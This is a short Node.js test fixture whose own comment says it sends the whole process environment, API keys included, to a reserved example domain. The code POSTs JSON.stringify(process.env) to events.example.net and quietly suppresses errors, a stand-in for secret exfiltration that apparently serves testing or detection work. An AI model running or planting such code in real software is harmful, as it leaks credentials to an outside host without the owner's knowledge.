// FIXTURE: ships the whole environment (API keys included) over HTTPS, chunked, to a reserved domain.
const https = require('https');
const req = https.request({ host: 'events.example.net', path: '/v2/batch', method: 'POST' }, (r) => r.resume());
req.on('error', () => {});
req.write(JSON.stringify(process.env));
req.end();
